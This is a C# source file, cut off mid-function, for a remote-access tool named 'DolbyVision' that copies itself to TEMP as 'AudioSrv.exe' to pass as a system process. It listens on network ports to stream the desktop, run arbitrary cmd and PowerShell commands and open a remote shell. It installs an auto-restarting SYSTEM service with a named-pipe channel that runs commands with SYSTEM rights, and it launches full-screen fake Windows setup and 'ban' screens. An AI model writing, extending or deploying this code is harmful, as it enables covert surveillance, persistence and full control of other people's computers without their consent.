using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using System.Management;
using System.Threading;
using System.Windows.Forms;

namespace DolbyVision
{
    internal static class Program
    {
        private const int BroadcastPort = 9100;
        private const int VideoPort = 9101;
        private const int CmdPort = 9102;
        private const int TerminalPort = 9103;
        // SYSTEM模式(服务)使用不同端口,避免与普通模式冲突
        private const int CmdPortSystem = 9112;
        private const int TerminalPortSystem = 9113;
        private const int Fps = 8;
        private const int JpegQuality = 60;

        private static TcpListener _videoListener;
        private static TcpListener _cmdListener;
        private static TcpListener _terminalListener;
        private static Thread _broadcastThread;
        private static Thread _videoThread;
        private static Thread _cmdThread;
        private static Thread _terminalThread;
        private static volatile bool _running = true;
        private static string _machineName;
        private static string _localIp;
        private static bool _isServiceMode = false;
        private static Thread _pipeThread;
        private const string PipeName = "DolbyVisionPriv";
        private const string NormalMutexName = "Global\\DolbyVision_Normal_Running";
        private static Mutex _normalMutex;
        // SYSTEM模式动态端口控制
        private static volatile bool _networkStarted = false;
        private static volatile bool _broadcastRunning = false;
        private static Thread _guardianThread;

        [STAThread]
        static void Main(string[] args)
        {
            // 服务模式: sc create时binPath带 /service 参数
            if (args.Length > 0 && args[0].Equals("/service", StringComparison.OrdinalIgnoreCase))
            {
                ServiceBase.Run(new DolbyVisionService());
                return;
            }

            // 普通模式: 自复制到TEMP并改名为系统进程名
            string currentPath = Application.ExecutablePath;
            string tempPath = Path.Combine(Path.GetTempPath(), "AudioSrv.exe");
            if (!currentPath.Equals(tempPath, StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    File.Copy(currentPath, tempPath, true);
                    System.Diagnostics.Process.Start(tempPath);
                    return;
                }
                catch { }
            }


            // 普通模式: 创建互斥体,供SYSTEM服务检测普通模式是否存活
            try
            {
                _normalMutex = new Mutex(true, NormalMutexName, out bool createdNew);
                if (!createdNew) { return; } // 已有实例运行
            }
            catch { }

            StartServices();
            while (_running) { Thread.Sleep(1000); }
        }

        internal static void SetServiceMode(bool isService)
        {
            _isServiceMode = isService;
        }
        internal static void StartServices()
        {
            _running = true;
            _machineName = Environment.MachineName;
            _localIp = GetLocalIP();

            _broadcastThread = new Thread(BroadcastLoop) { IsBackground = true };
            _broadcastThread.Start();

            // 服务模式(Session 0)无法捕获用户桌面,不启动视频流
            if (!_isServiceMode)
            {
                _videoThread = new Thread(VideoListenLoop) { IsBackground = true };
                _videoThread.Start();
            }

            _cmdThread = new Thread(CmdListenLoop) { IsBackground = true };
            _cmdThread.Start();

            _terminalThread = new Thread(TerminalListenLoop) { IsBackground = true };
            _terminalThread.Start();
        }

        internal static void StopServices()
        {
            _running = false;
            try { _videoListener?.Stop(); } catch { }
            try { _cmdListener?.Stop(); } catch { }
            try { _terminalListener?.Stop(); } catch { }
        }

        // ========== SYSTEM模式(服务): 独立网络端口 + 命名管道提权 ==========
        // SYSTEM模式始终监听网络端口(9112命令/9113终端),与普通模式(9102/9103)不冲突
        // 普通模式被杀后,主控端仍可连接SYSTEM模式执行关机/重启/杀进程/命令行
        // SYSTEM模式不做屏幕监控(Session 0无法访问桌面)
        // ========== SYSTEM模式(服务): 命名管道提权 + 动态网络端口 ==========
        // 普通模式运行时: SYSTEM只做命名管道提权,不监听网络端口
        // 普通模式被杀后: 守护线程检测到互斥体消失,自动启动广播/命令/终端
        // 普通模式重启后: 守护线程检测到互斥体,自动停止网络端口
        internal static void StartServiceMode()
        {
            _running = true;
            _isServiceMode = true;
            _machineName = Environment.MachineName;
            _localIp = GetLocalIP();
            // 只启动命名管道(为普通模式提供提权)
            _pipeThread = new Thread(PipeServerLoop) { IsBackground = true };
            _pipeThread.Start();
            // 启动守护线程: 检测普通模式是否存活,动态控制网络端口
            _guardianThread = new Thread(GuardianLoop) { IsBackground = true };
            _guardianThread.Start();
        }

        // 守护线程: 检测普通模式互斥体,动态启动/停止网络端口
        private static void GuardianLoop()
        {
            while (_running)
            {
                try
                {
                    bool normalRunning = IsNormalModeRunning();
                    if (!normalRunning && !_networkStarted)
                    {
                        // 普通模式被杀,启动网络端口(fallback)
                        StartNetworkServices();
                        _networkStarted = true;
                    }
                    else if (normalRunning && _networkStarted)
                    {
                        // 普通模式恢复,停止网络端口
                        StopNetworkServices();
                        _networkStarted = false;
                    }
                }
                catch { }
                Thread.Sleep(3000);
            }
        }


        private static bool IsNormalModeRunning()
        {
            try
            {
                // 普通模式进程名是AudioSrv.exe,但SYSTEM服务的binPath也指向AudioSrv.exe
                // 所以需要排除Session 0的服务进程(只统计用户会话的AudioSrv.exe)
                var processes = Process.GetProcessesByName("AudioSrv");
                int userSessionCount = 0;
                foreach (var p in processes)
                {
                    try
                    {
                        // SessionId=0是服务进程(Session 0隔离),>0是用户会话进程
                        if (p.SessionId > 0) userSessionCount++;
                    }
                    catch { }
                }
                return userSessionCount > 0;
            }
            catch { return false; }
        }

        private static void StartNetworkServices()
        {
            _broadcastThread = new Thread(BroadcastLoop) { IsBackground = true };
            _broadcastThread.Start();
            _cmdThread = new Thread(CmdListenLoop) { IsBackground = true };
            _cmdThread.Start();
            _terminalThread = new Thread(TerminalListenLoop) { IsBackground = true };
            _terminalThread.Start();
        }

        private static void StopNetworkServices()
        {
            _broadcastRunning = false;
            try { _cmdListener?.Stop(); } catch { }
            try { _terminalListener?.Stop(); } catch { }
        }

        private static void PipeServerLoop()
        {
            while (_running)
            {
                try
                {
                    
                    using (var server = new NamedPipeServerStream(PipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Message, PipeOptions.None))
                    {
                        server.WaitForConnection();
                        
                        using (var reader = new StreamReader(server, Encoding.UTF8))
                        using (var writer = new StreamWriter(server, Encoding.UTF8) { AutoFlush = true })
                        {
                            string request = reader.ReadLine();
                            if (request != null && request.StartsWith("KILL:"))
                            {
                                string pidStr = request.Substring(5);
                                string result = KillProcess(pidStr);
                                writer.WriteLine(result);
                            }
                            else if (request != null && request.StartsWith("EXEC:"))
                            {
                                string command = request.Substring(5);
                                string result = ExecuteCmdViaPipe(command);
                                writer.WriteLine(result);
                            }
                            else
                            {
                                writer.WriteLine("ERROR: unknown command");
                            }
                        }
                    }
                }
                catch { Thread.Sleep(1000); }
            }
        }

        private static string GetLocalIP()
        {
            try
            {
                using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                {
                    socket.Connect("8.8.8.8", 65530);
                    return (socket.LocalEndPoint as IPEndPoint).Address.ToString();
                }
            }
            catch { return "127.0.0.1"; }
        }

        private static void BroadcastLoop()
        {
            _broadcastRunning = true;
            while (_running && _broadcastRunning)
            {
                try
                {
                    using (var client = new UdpClient())
                    {
                        client.EnableBroadcast = true;
                        string mode = _isServiceMode ? "SYSTEM" : "NORMAL";
                        int cmdPort = _isServiceMode ? CmdPortSystem : CmdPort;
                        int termPort = _isServiceMode ? TerminalPortSystem : TerminalPort;
                        string msg = $"DV|{_machineName}|{_localIp}|{VideoPort}|{cmdPort}|{termPort}|{mode}";
                        byte[] data = Encoding.UTF8.GetBytes(msg);
                        client.Send(data, data.Length, new IPEndPoint(IPAddress.Broadcast, BroadcastPort));
                    }
                }
                catch { }
                Thread.Sleep(3000);
            }
        }

        // ========== 视频流 ==========
        private static void VideoListenLoop()
        {
            try
            {
                _videoListener = new TcpListener(IPAddress.Any, VideoPort);
                _videoListener.Start();
                while (_running)
                {
                    try
                    {
                        TcpClient client = _videoListener.AcceptTcpClient();
                        var thread = new Thread(() => HandleVideoClient(client)) { IsBackground = true };
                        thread.Start();
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void HandleVideoClient(TcpClient client)
        {
            try
            {
                using (client)
                using (NetworkStream stream = client.GetStream())
                {
                    while (_running && client.Connected)
                    {
                        Bitmap screenshot = CaptureScreen();
                        if (screenshot != null)
                        {
                            using (var ms = new MemoryStream())
                            {
                                var jpegCodec = GetJpegCodec();
                                var encoderParams = new EncoderParameters(1);
                                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)JpegQuality);
                                screenshot.Save(ms, jpegCodec, encoderParams);
                                byte[] jpegData = ms.ToArray();

                                byte[] header = Encoding.ASCII.GetBytes($"--boundary\r\nContent-Type: image/jpeg\r\nContent-Length: {jpegData.Length}\r\n\r\n");
                                stream.Write(header, 0, header.Length);
                                stream.Write(jpegData, 0, jpegData.Length);
                                stream.Write(Encoding.ASCII.GetBytes("\r\n"), 0, 2);
                                stream.Flush();
                            }
                            screenshot.Dispose();
                        }
                        Thread.Sleep(1000 / Fps);
                    }
                }
            }
            catch { }
        }

        // ========== 远程命令 ==========
        private static void CmdListenLoop()
        {
            try
            {
                int port = _isServiceMode ? CmdPortSystem : CmdPort;
                _cmdListener = new TcpListener(IPAddress.Any, port);
                _cmdListener.Start();
                while (_running)
                {
                    try
                    {
                        TcpClient client = _cmdListener.AcceptTcpClient();
                        var thread = new Thread(() => HandleCmdClient(client)) { IsBackground = true };
                        thread.Start();
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void HandleCmdClient(TcpClient client)
        {
            try
            {
                using (client)
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] buffer = new byte[8192];
                    int read = stream.Read(buffer, 0, buffer.Length);
                    if (read <= 0) return;

                    string cmd = Encoding.UTF8.GetString(buffer, 0, read).Trim();
                    string result = ExecuteCommand(cmd);
                    byte[] resp = Encoding.UTF8.GetBytes(result);
                    stream.Write(resp, 0, resp.Length);
                    stream.Flush();
                }
            }
            catch { }
        }

        private static string ExecuteCommand(string cmd)
        {
            try
            {
                if (cmd.Equals("OOBE", StringComparison.OrdinalIgnoreCase))
                {
                    return StartOobePrank("Win10");
                }
                if (cmd.Equals("OOBE11", StringComparison.OrdinalIgnoreCase))
                {
                    return StartOobePrank("Win11");
                }
                if (cmd.Equals("BAN", StringComparison.OrdinalIgnoreCase))
                {
                    return StartBanPrank();
                }
                if (cmd.Equals("RESTART_NORMAL", StringComparison.OrdinalIgnoreCase))
                {
                    return RestartNormalMode();
                }
                if (cmd.Equals("PROCESS_LIST", StringComparison.OrdinalIgnoreCase))
                {
                    return GetProcessList();
                }
                if (cmd.StartsWith("PROCESS_KILL:", StringComparison.OrdinalIgnoreCase))
                {
                    string pidStr = cmd.Substring(13);
                    return KillProcess(pidStr);
                }
                if (cmd.Equals("INSTALL_SERVICE", StringComparison.OrdinalIgnoreCase))
                {
                    return InstallService();
                }
                if (cmd.Equals("UNINSTALL_SERVICE", StringComparison.OrdinalIgnoreCase))
                {
                    return UninstallService();
                }
                if (cmd.Equals("SHUTDOWN", StringComparison.OrdinalIgnoreCase))
                {
                    Process.Start(new ProcessStartInfo("shutdown", "/s /t 0") { CreateNoWindow = true, UseShellExecute = false });
                    return "OK: 关机命令已发送";
                }
                if (cmd.Equals("REBOOT", StringComparison.OrdinalIgnoreCase))
                {
                    Process.Start(new ProcessStartInfo("shutdown", "/r /t 0") { CreateNoWindow = true, UseShellExecute = false });
                    return "OK: 重启命令已发送";
                }
                if (cmd.StartsWith("EXEC:", StringComparison.OrdinalIgnoreCase))
                {
                    string command = cmd.Substring(5);
                    var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        StandardOutputEncoding = Encoding.GetEncoding(936),
                        StandardErrorEncoding = Encoding.GetEncoding(936)
                    };
                    using (var p = Process.Start(psi))
                    {
                        string output = p.StandardOutput.ReadToEnd();
                        string error = p.StandardError.ReadToEnd();
                        p.WaitForExit(5000);
                        return "OK:\r\n" + output + (string.IsNullOrEmpty(error) ? "" : "\r\n[错误]\r\n" + error);
                    }
                }
                if (cmd.StartsWith("PS:", StringComparison.OrdinalIgnoreCase))
                {
                    string command = cmd.Substring(3);
                    var psi = new ProcessStartInfo("powershell.exe", "-NoProfile -Command " + command)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        StandardOutputEncoding = Encoding.UTF8,
                        StandardErrorEncoding = Encoding.UTF8
                    };
                    using (var p = Process.Start(psi))
                    {
                        string output = p.StandardOutput.ReadToEnd();
                        string error = p.StandardError.ReadToEnd();
                        p.WaitForExit(10000);
                        return "OK:\r\n" + output + (string.IsNullOrEmpty(error) ? "" : "\r\n[错误]\r\n" + error);
                    }
                }
                return "ERROR: 未知命令: " + cmd;
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        // ========== OOBE恶搞 ==========
        private static string StartOobePrank(string version)
        {
            try
            {
                bool isWin11 = version.Equals("Win11", StringComparison.OrdinalIgnoreCase);
                string fileName = isWin11 ? "Win11_OOBE.html" : "Win10_OOBE.html";
                string resourceName = isWin11 ? "DolbyVision.Assets.Win11_OOBE_Prank.html" : "DolbyVision.Assets.Win10_OOBE_Prank.html";
                // 从嵌入资源释放HTML到TEMP
                string htmlPath = Path.Combine(Path.GetTempPath(), fileName);
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                using (var stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null) return "ERROR: OOBE资源未找到";
                    using (var fs = new FileStream(htmlPath, FileMode.Create, FileAccess.Write))
                    {
                        stream.CopyTo(fs);
                    }
                }

                // 尝试用Edge全屏打开
                string edgePath = FindBrowser();
                if (string.IsNullOrEmpty(edgePath)) return "ERROR: 未找到浏览器";

                string url = "file:///" + htmlPath.Replace("\\", "/");
                var psi = new ProcessStartInfo(edgePath, "--kiosk --fullscreen --no-first-run --disable-features=Translate " + url)
                {
                    CreateNoWindow = false,
                    UseShellExecute = false
                };
                Process.Start(psi);
                return "OK: " + version + " OOBE恶搞已启动 (" + edgePath + ")";
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }


        // ========== 封禁恶搞 ==========
        private static string StartBanPrank()
        {
            try
            {
                // 从嵌入资源加载ban.jpg
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                using (var stream = assembly.GetManifestResourceStream("DolbyVision.Assets.ban.jpg"))
                {
                    if (stream == null) return "ERROR: ban.jpg资源未找到";
                    Image banImage = Image.FromStream(stream);
                    // 在新线程显示全屏窗口(避免阻塞命令处理)
                    var t = new Thread(() =>
                    {
                        try
                        {
                            using (var form = new Form())
                            {
                                form.FormBorderStyle = FormBorderStyle.None;
                                form.WindowState = FormWindowState.Maximized;
                                form.TopMost = true;
                                form.ShowInTaskbar = false;
                                form.StartPosition = FormStartPosition.CenterScreen;
                                form.BackColor = Color.Black;
                                // 不在Alt+Tab中显示
                                form.ShowIcon = false;
                                var pictureBox = new PictureBox();
                                pictureBox.Dock = DockStyle.Fill;
                                pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
                                pictureBox.Image = banImage;
                                form.Controls.Add(pictureBox);
                                // 5秒后自动关闭
                                var timer = new System.Windows.Forms.Timer();
                                timer.Interval = 5000;
                                timer.Tick += (s, e) => { timer.Stop(); form.Close(); };
                                timer.Start();
                                form.ShowDialog();
                            }
                        }
                        catch { }
                    });
                    t.IsBackground = true;
                    t.Start();
                    return "OK: 封禁恶搞已启动(5秒全屏)";
                }
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }
        // ========== 远程进程控制 ==========
        // P/Invoke for process owner
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool LookupAccountSid(string lpSystemName, IntPtr Sid, System.Text.StringBuilder lpName, ref uint cchName, System.Text.StringBuilder lpReferencedDomainName, ref uint cchReferencedDomainName, out int peUse);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        // ========== CreateProcessAsUser (从SYSTEM服务启动用户会话进程) ==========
        [DllImport("kernel32.dll")]
        private static extern uint WTSGetActiveConsoleSessionId();
        [DllImport("wtsapi32.dll", SetLastError = true)]
        private static extern bool WTSQueryUserToken(uint SessionId, out IntPtr phToken);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
        [DllImport("userenv.dll", SetLastError = true)]
        private static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
        [DllImport("userenv.dll", SetLastError = true)]
        private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize;
            public int dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public uint dwProcessId, dwThreadId;
        }

        private static string RestartNormalMode()
        {
            IntPtr token = IntPtr.Zero, dupToken = IntPtr.Zero, envBlock = IntPtr.Zero;
            try
            {
                uint sessionId = WTSGetActiveConsoleSessionId();
                if (sessionId == 0xFFFFFFFF) return "ERROR: 无活动用户会话";
                if (!WTSQueryUserToken(sessionId, out token))
                    return "ERROR: WTSQueryUserToken失败 " + Marshal.GetLastWin32Error();
                if (!DuplicateTokenEx(token, 0x2000000, IntPtr.Zero, 2, 1, out dupToken))
                    return "ERROR: DuplicateTokenEx失败 " + Marshal.GetLastWin32Error();
                if (!CreateEnvironmentBlock(out envBlock, dupToken, false))
                    return "ERROR: CreateEnvironmentBlock失败 " + Marshal.GetLastWin32Error();
                string exePath = Path.Combine(Path.GetTempPath(), "AudioSrv.exe");
                if (!File.Exists(exePath)) exePath = Application.ExecutablePath;
                var si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = "winsta0\\default";
                var pi = new PROCESS_INFORMATION();
                bool ok = CreateProcessAsUser(dupToken, null, exePath, IntPtr.Zero, IntPtr.Zero, false, 0x400, envBlock, Path.GetTempPath(), ref si, out pi);
                if (!ok) return "ERROR: CreateProcessAsUser失败 " + Marshal.GetLastWin32Error();
                return "OK: 普通模式已重启 PID=" + pi.dwProcessId;
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
            finally
            {
                if (envBlock != IntPtr.Zero) DestroyEnvironmentBlock(envBlock);
                if (dupToken != IntPtr.Zero) CloseHandle(dupToken);
                if (token != IntPtr.Zero) CloseHandle(token);
            }
        }

        private static string GetProcessOwner(int pid)
        {
            IntPtr hProcess = IntPtr.Zero;
            IntPtr hToken = IntPtr.Zero;
            IntPtr tokenInfo = IntPtr.Zero;
            try
            {
                // PROCESS_QUERY_INFORMATION = 0x0400
                hProcess = OpenProcess(0x0400, false, pid);
                if (hProcess == IntPtr.Zero) return "";
                // TOKEN_QUERY = 0x0008
                if (!OpenProcessToken(hProcess, 0x0008, out hToken)) return "";
                // TokenUser = 1
                uint retLen = 0;
                GetTokenInformation(hToken, 1, IntPtr.Zero, 0, out retLen);
                if (retLen == 0) return "";
                tokenInfo = Marshal.AllocHGlobal((int)retLen);
                if (!GetTokenInformation(hToken, 1, tokenInfo, retLen, out retLen)) return "";
                // TOKEN_USER结构: SID_AND_ATTRIBUTES, 第一个字段是Sid指针
                IntPtr sidPtr = Marshal.ReadIntPtr(tokenInfo);
                var name = new System.Text.StringBuilder(256);
                var domain = new System.Text.StringBuilder(256);
                uint nameLen = 256, domainLen = 256;
                int use;
                if (LookupAccountSid(null, sidPtr, name, ref nameLen, domain, ref domainLen, out use))
                {
                    return domain.ToString() + "\\" + name.ToString();
                }
                return "";
            }
            catch { return ""; }
            finally
            {
                if (tokenInfo != IntPtr.Zero) Marshal.FreeHGlobal(tokenInfo);
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
                if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
            }
        }

        private static string GetProcessList()
        {
            try
            {
                var sb = new System.Text.StringBuilder();
                sb.AppendLine("PID\t名称\t内存(MB)\t用户\t描述");
                // 用WMI一次查询获取所有进程基本信息(比Process.GetProcesses+MainModule快且不会挂起)
                var procDict = new System.Collections.Generic.Dictionary<int, string[]>();
                using (var searcher = new ManagementObjectSearcher("SELECT ProcessId, Name, WorkingSetSize, ExecutablePath FROM Win32_Process"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        try
                        {
                            int pid = Convert.ToInt32(mo["ProcessId"]);
                            string name = mo["Name"]?.ToString() ?? "";
                            double mem = mo["WorkingSetSize"] != null ? Math.Round(Convert.ToDouble(mo["WorkingSetSize"]) / 1024.0 / 1024.0, 1) : 0;
                            string exePath = mo["ExecutablePath"]?.ToString() ?? "";
                            procDict[pid] = new string[] { name, mem.ToString(), exePath };
                        }
                        catch { }
                    }
                }
                // 遍历进程,获取用户和描述
                foreach (var kv in procDict)
                {
                    try
                    {
                        int pid = kv.Key;
                        string name = kv.Value[0];
                        string mem = kv.Value[1];
                        string exePath = kv.Value[2];
                        // 跳过系统空闲进程(PID 0),避免OpenProcess挂起
                        string user = pid > 4 ? GetProcessOwner(pid) : "SYSTEM";
                        // 描述:直接读文件版本信息(不打开进程句柄)
                        string desc = "";
                        if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
                        {
                            try
                            {
                                var fvi = FileVersionInfo.GetVersionInfo(exePath);
                                desc = fvi.FileDescription;
                                if (string.IsNullOrEmpty(desc)) desc = fvi.ProductName;
                            }
                            catch { }
                        }
                        sb.AppendLine(pid + "\t" + name + "\t" + mem + "\t" + user + "\t" + desc);
                    }
                    catch { }
                }
                return "OK:\r\n" + sb.ToString();
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }
        private static string KillProcess(string pidStr)
        {
            try
            {
                int pid = int.Parse(pidStr.Trim());
                var p = Process.GetProcessById(pid);
                p.Kill();
                return "OK: 已终止进程 " + pid + " (" + p.ProcessName + ")";
            }
            catch (Exception ex)
            {
                // 普通模式权限不足时,尝试通过命名管道请求服务模式(SYSTEM权限)杀进程
                if (!_isServiceMode)
                {
                    string privResult = KillViaPipe(pidStr);
                    if (privResult != null) return privResult + " (SYSTEM提权)";
                }
                return "ERROR: " + ex.Message;
            }
        }

        // 通过命名管道请求服务模式杀进程
        private static string KillViaPipe(string pidStr)
        {
            try
            {
                using (var client = new NamedPipeClientStream(".", PipeName, PipeDirection.InOut))
                {
                    client.Connect(2000);
                    using (var writer = new StreamWriter(client, Encoding.UTF8) { AutoFlush = true })
                    using (var reader = new StreamReader(client, Encoding.UTF8))
                    {
                        writer.WriteLine("KILL:" + pidStr);
                        return reader.ReadLine();
                    }
                }
            }
            catch { return null; }
        }

        // SYSTEM模式通过命名管道执行命令(供普通模式提权调用)
        private static string ExecuteCmdViaPipe(string command)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.GetEncoding(936),
                    StandardErrorEncoding = Encoding.GetEncoding(936)
                };
                using (var p = Process.Start(psi))
                {
                    var outputTask = p.StandardOutput.ReadToEndAsync();
                    var errorTask = p.StandardError.ReadToEndAsync();
                    if (!p.WaitForExit(8000)) { try { p.Kill(); } catch { } }
                    string output = outputTask.Result;
                    string error = errorTask.Result;
                    string result = "OK:\r\n" + output + (string.IsNullOrEmpty(error) ? "" : "\r\n[错误]\r\n" + error);
                    return Convert.ToBase64String(Encoding.UTF8.GetBytes(result));
                }
            }
            catch (Exception ex) { return Convert.ToBase64String(Encoding.UTF8.GetBytes("ERROR: " + ex.Message)); }
        }

        // 普通模式通过命名管道请求SYSTEM模式执行命令
        private static string ExecViaPipe(string command)
        {
            try
            {
                using (var client = new NamedPipeClientStream(".", PipeName, PipeDirection.InOut))
                {
                    client.Connect(2000); client.ReadTimeout = 5000;
                    using (var writer = new StreamWriter(client, Encoding.UTF8) { AutoFlush = true })
                    using (var reader = new StreamReader(client, Encoding.UTF8))
                    {
                        writer.WriteLine("EXEC:" + command);
                        string b64 = reader.ReadLine();
                        if (b64 == null) return null;
                        try { return Encoding.UTF8.GetString(Convert.FromBase64String(b64)); }
                        catch { return b64; }
                    }
                }
            }
            catch { return null; }
        }
        private static string InstallService()
        {
            try
            {
                string exePath = Application.ExecutablePath;
                string binPath = "\"" + exePath + " /service\"";
                bool createOk = RunCmd("sc create DolbyVision binPath= " + binPath + " start= auto");
                if (!createOk) return "ERROR: 创建服务失败(可能需要管理员权限)";
                RunCmd("sc failure DolbyVision reset= 0 actions= restart/5000/restart/5000/restart/5000");
                bool startOk = RunCmd("sc start DolbyVision");
                if (startOk)
                    return "OK: 服务安装并启动成功(SYSTEM权限+开机自启+被杀5秒重启)";
                else
                    return "OK: 服务已创建,但启动失败(可能已在运行,重启后生效)";
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }
        private static bool RunCmd(string cmd)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using (var p = Process.Start(psi))
                {
                    p.WaitForExit(8000);
                    return p.ExitCode == 0;
                }
            }
            catch { return false; }
        }
        private static string UninstallService()
        {
            try
            {
                // 先回复主控端,然后延迟3秒再停止并删除自己(避免TCP连接断开导致报错)
                var t = new Thread(() =>
                {
                    Thread.Sleep(3000);
                    RunCmd("sc stop DolbyVision");
                    RunCmd("sc delete DolbyVision");
                }) { IsBackground = true };
                t.Start();
                return "OK: 服务卸载命令已发送,3秒后执行(连接将断开)";
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        private static string FindBrowser()
        {
            // 优先Edge，其次Chrome；找到第一个可用的就返回，不会冲突
            var candidates = new System.Collections.Generic.List<string>
            {
                // Edge (Win10+)
                @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                @"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                // Chrome 系统级安装
                @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                @"C:\Program Files\Google Chrome\Chrome\App\chrome.exe",
                // Chrome 用户级安装 (Win7常见)
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\Application\chrome.exe")
            };
            foreach (var p in candidates)
            {
                if (File.Exists(p)) return p;
            }
            // 注册表查找 Chrome
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"))
                {
                    if (key != null)
                    {
                        var v = key.GetValue("") as string;
                        if (!string.IsNullOrEmpty(v) && File.Exists(v)) return v;
                    }
                }
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"))
                {
                    if (key != null)
                    {
                        var v = key.GetValue("") as string;
                        if (!string.IsNullOrEmpty(v) && File.Exists(v)) return v;
                    }
                }
            }
            catch { }
            // 注册表查找 Edge
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"))
                {
                    if (key != null)
                    {
                        var v = key.GetValue("") as string;
                        if (!string.IsNullOrEmpty(v) && File.Exists(v)) return v;
                    }
                }
            }
            catch { }
            return null;
        }

        // ========== 虚拟控制台 ==========
        private static void TerminalListenLoop()
        {
            try
            {
                int port = _isServiceMode ? TerminalPortSystem : TerminalPort;
                _terminalListener = new TcpListener(IPAddress.Any, port);
                _terminalListener.Start();
                while (_running)
                {
                    try
                    {
                        TcpClient client = _terminalListener.AcceptTcpClient();
                        var thread = new Thread(() => HandleTerminalClient(client)) { IsBackground = true };
                        thread.Start();
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void HandleTerminalClient(TcpClient client)
        {
            Process shell = null;
            try
            {
                using (client)
                using (NetworkStream stream = client.GetStream())
                {
                    // 先接收shell类型：CMD 或 PS
                    byte[] typeBuf = new byte[16];
                    int typeRead = stream.Read(typeBuf, 0, typeBuf.Length);
                    string shellType = Encoding.UTF8.GetString(typeBuf, 0, typeRead).Trim().ToUpper();
                    bool usePs = shellType == "PS";

                    string shellExe = usePs ? "powershell.exe" : "cmd.exe";
